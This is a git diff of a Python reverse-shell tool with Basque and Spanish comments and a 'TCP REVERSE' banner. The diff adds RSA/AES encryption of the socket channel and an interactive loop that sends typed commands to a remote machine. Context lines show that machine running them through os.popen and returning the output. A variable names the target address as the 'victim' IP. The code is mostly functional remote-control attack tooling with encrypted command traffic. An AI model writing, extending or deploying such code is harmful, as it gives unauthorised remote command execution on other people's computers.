@@ -6,33 +6,90 @@ import sys
 import threading
 import zlib
 import pickle
+import json
+import binascii
 from fitxategiak.asimetric import asime
+from fitxategiak.aesencrypt import aesenc
 
 
 class server(object):
     def __init__(self,ip_bictima,portua,koneksioak):
-        print(ip_bictima)
-        print(portua)
-        print(koneksioak)
-        print("\n")
-        self.so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.so.bind((ip_bictima,portua))
-        self.so.listen(koneksioak)
-        self.soc , addr = self.so.accept()
-        self.GPG = asime(".")
-        self.GPG.Generastekey("server")
+        try: 
+            #jenerador de claves
+            self.GPG = asime(".")
+            self.GPG.Generastekey("server")  
+            s = """
+
+                              /|
+                             / |
+                            /__|______
+                            |  __  __  |
+                            | |  ||  | |
+                            | |  ||  | |
+                            | |__||__| |
+                            |  __  __()|  
+                            | |  ||  | +                          
+                            | |  ||  | |                          
+                            | |  ||  | |                          
+                            | |__||__| |                           
+                            |__________|                                                       
+
+                               _____ ____ ____    ____  _______     _______ ____  ____  _____ 
+                              |_   _/ ___|  _ \  |  _ \| ____\ \   / / ____|  _ \/ ___|| ____|
+                                | || |   | |_) | | |_) |  _|  \ \ / /|  _| | |_) \___ \|  _|  
+                                | || |___|  __/  |  _ <| |___  \ V / | |___|  _ < ___) | |___ 
+                                |_| \____|_|     |_| \_\_____|  \_/  |_____|_| \_\____/|_____|                                                                                                    
+
+                                            #  $                  &&&&&&            
+                                            # ##                 &&0000&&         
+                                            ####################&&&    &&&     
+                                            ####################&&&    &&&    RSA/AES ENCRIPTATION TCP 
+                                                                 &&0000&&     
+                                                                  &&&&&&                                            
+                """
+            print(s)    
+            print("\n")
+            self.encriAes = None
+            self.decriptAes = None
+            #conesion socekt
+            self.so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.so.bind((ip_bictima,portua))
+            self.so.listen(koneksioak)
+            self.soc , addr = self.so.accept()
+        except :
+            print("server error")
+        
+
+    def buffLengG(self):
+      lengEn = self.soc.recv(1024)
+      Strleng = str(self.decriptAes.decript(lengEn),encoding='utf-8')
+      leng = int(Strleng)
+      print(leng)
+      self.soc.send(b'1')
+      return(leng)
+
 
 
     
     def comandLine(self):
-          user = win32api.GetUserName()
-          url = os.getcwd()#ruta aktuala 
-          ruter = bytes(user+'@'+url,encoding='utf-8')
-          ruterENc = self.GPG.encrypted(ruter)
-          self.soc.send(ruterENc)# bidali ruta aktuala
-          hartuta = self.soc.recv(1024) # guk bidalitako mezua hartuko du (1024) bytes
-          stri = str(hartuta,encoding='utf-8')   
-          print(stri)
+        lenBUffer = self.buffLengG()
+        rutaJaso = self.soc.recv(lenBUffer)
+        rutaJasoDEC = self.decriptAes.decript(rutaJaso)
+        url = str(rutaJasoDEC,encoding='utf-8')
+        mezua = input(url + ">")
+        if len(mezua) == 0 :
+            mezua = " " 
+        mezuaENc = self.encriAes.encript(bytes(mezua,encoding='utf-8'))
+        self.soc.send(mezuaENc)
+        return mezua
+
+
+    def cmdGlobal(self):
+       lenBuffer = self.buffLengG()
+       recCmd = self.soc.recv(lenBuffer)
+       desCmd = self.decriptAes.decript(recCmd)
+       print(str(desCmd,encoding='utf-8'))
+
 
     def getPuKey(self):
         keyP =  self.soc.recv(1024)
@@ -51,7 +108,25 @@ class server(object):
         self.GPG.loadPublic("pUcliente.pem")
         os.chdir("..\\prybate")
         self.GPG.loadPrymari("prybate.pem")
-        print(self.GPG.private_key)
+        os.chdir("../../")
+        self.GPG.delete()
+
+    def Aeskeyload(self):
+        key = binascii.hexlify(os.urandom(32))
+        iv = binascii.hexlify(os.urandom(16))
+        decriAes = {}
+        decriAes["key"] = str(key,encoding='utf-8')
+        decriAes["iv"] = str(iv,encoding='utf-8')
+        strDecriAes = json.dumps(decriAes)
+        bytDecriAes = bytes(strDecriAes,encoding='utf-8')
+        self.decriptAes = aesenc(binascii.unhexlify(bytes(decriAes["key"],encoding='utf-8')),binascii.unhexlify(bytes(decriAes["iv"],encoding='utf-8')))
+        EnencriAes = self.soc.recv(1024)
+        DeencriAes = str(self.GPG.decrypt(EnencriAes),encoding='utf-8')
+        encriAes = json.loads(DeencriAes)
+        self.encriAes = aesenc(binascii.unhexlify(bytes(encriAes['key'],encoding='utf-8')),binascii.unhexlify(bytes(encriAes['iv'],encoding='utf-8')))
+        EndecriAes = self.GPG.encrypted(bytDecriAes)
+        self.soc.send(EndecriAes)
+       
 
     def koneksioa(self):
       while True:
@@ -97,7 +172,7 @@ class server(object):
                     except IOError as e: # ruta gaizki baldinbadago errore bat bidaliko dizu 
                          erantzuna = "comandoa gaizki dago"
               self.soc.send(bytes(erantzuna,encoding = 'utf-8')) # erantzuna bidaliko du 
-          elif comand[0] != "local":
+          elif comand[0] != " ":
             erantzuna = " " #erantzuna utza izango da
             balioa = os.popen(stri,'r',1).close()# guk idatzitako komandoa exekutatuko du errorearen mezua bidaliz
             erantzuna = os.popen(stri,'r',1).read()#komandoaren errorea  
@@ -161,24 +236,24 @@ class server(object):
       #self.so.close()tcp koneksioa amaitu
       self.soc.close()#tcp koneksioa amaitu
 
-ser = server("192.168.0.14",9999,1)
+ser = server("192.168.1.137",9999,1)
 ser.getPuKey()
 ser.postPuKey()
 ser.keysLoad()
+ser.Aeskeyload()
 
 while True:
     comand =  ser.comandLine()
-
-
-
-
-
-
-#recv mezua lortzeko balio du udp protokoloan
-#send mezua bidaltzeko balio du udp protokoloan
-
-
-
-
-
-
+    if len(comand) != 1:
+        comdaExe = comand.split(" ")
+        print(comdaExe)
+        arrComad = []
+        for fd in comdaExe:
+          if fd != "":
+            arrComad.append(fd)
+        if arrComad[0] == "cd":
+         print("cd")
+        if arrComad[0] == "exit":
+           break
+        else:
+         ser.cmdGlobal()
